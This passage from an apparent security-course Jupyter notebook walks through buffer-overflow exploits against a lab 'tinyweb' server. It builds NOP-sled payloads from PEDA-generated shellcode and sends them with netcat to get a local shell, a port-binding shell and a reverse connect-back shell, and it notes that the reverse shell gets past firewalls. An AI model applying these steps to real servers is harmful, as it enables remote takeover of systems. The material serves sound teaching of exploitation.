    "```bash\n",
    "echo $((524+4-24-30*4))\n",
    "```\n",
    "\n",
    "- find soft landing address in nop sled about 100 bytes away from the base address; just for safety!\n",
    "\n",
    "```bash\n",
    "printf \"%x\" $((address of request + 100))\n",
    "```\n",
    "\n",
    "- create and send the final exploit code\n",
    "\n",
    "```bash\n",
    "echo -n $(perl -e 'print \"\\x90\"x384'; cat shellcode.bin; perl -e 'print \"landing address in reverse order\"x30 . \"\\r\\n\"') > tinyexploit.txt\n",
    "cat tinyexploit.txt | nc -v 127.0.0.1 [port]\n",
    "```\n",
    "\n",
    "- you'll get a local shell on the terminal where tinyweb.exe is running"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Remote Exploit - Port Binding Shellcode\n",
    "\n",
    "- use a different VM or system as an attacker machine\n",
    "- create Port Binding Shellcode Exploit\n",
    "- Generate Shellcode using GDB PEDA\n",
    "- add about 100 bytes to the beginning address of request to get the working landing address\n",
    "\n",
    "```\n",
    "gdb-peda$ shellcode generate\n",
    "gdb-peda$ shellcode generate x86/linux bindport  port ip\n",
    "$ perl -e 'print \"copy line by line\"' >> bindport.bin\n",
    "$ echo -n $(perl -e 'print \"\\x90\"x384'; cat bindport.bin; perl -e 'print \"landing address in reverse order\"x30 . \"\\r\\n\"') > tinyexploit.bin\n",
    "$ cat tinyexploit.txt | nc -v ip port\n",
    "```\n",
    "\n",
    "- from another shell use **nc** to connect to the victim ip using the shellcode port\n",
    "\n",
    "```bash\n",
    "nc -v [ip] [port]\n",
    "``` \n",
    "\n",
    "- connecting to the victim machine is not easy due to firewall and IDS, IPS, etc.\n",
    "- however, outgoing connection is typically allowed\n",
    "- use the following exploit!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Remote Exploit - Connect-back Shellcode\n",
    "\n",
    "- use a different VM or system as an attacker machine\n",
    "- create connect back (TCP Reverse connect) shellcode\n",
    "- Generate Shellcode using GDB PEDA\n",
    "- add about 100 bytes to the beginning address of request to get the working landing address\n",
    "\n",
    "```bash \n",
    "gdb-peda$ shellcode generate x86/linux connect port ip\n",
    "\n",
    "```\n",
    "\n",
    "- write shellcode to a file as binary one line at a time\n",
    "\n",
    "\n",
    "```bash\n",
    "$ echo -n -e \"shellcode line1\" > reverse_tcp.bin\n",
    "$ echo -n -e \"shellcode line2\" >> reverse_tcp.bin\n",
    "...\n",
    "```\n",
    "\n",
    "- calculate [\\<NOP sled>*n + reverse_tcp.bin + \\<repeated return address>]\n",
    "- repeated return address = \\<address of request> + 100\n",
    "- run a server on attacker machine so the victim can connect back\n",
    "\n",
    "```bash\n",
    "    nc -v -l -p port\n",
    "```\n",
    "\n",
    "- create the exploit code and send it as a request to the Tinyweb server using netcat\n",
    "\n",
    "```bash\n",
    "$ echo -n -e $(perl -e 'print \"\\x90\"xn; cat reverse_tcp.bin; perl -e 'print \"controlled return add\"xN . \"\\r\\n\"' | nc -v [ip] [port]\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
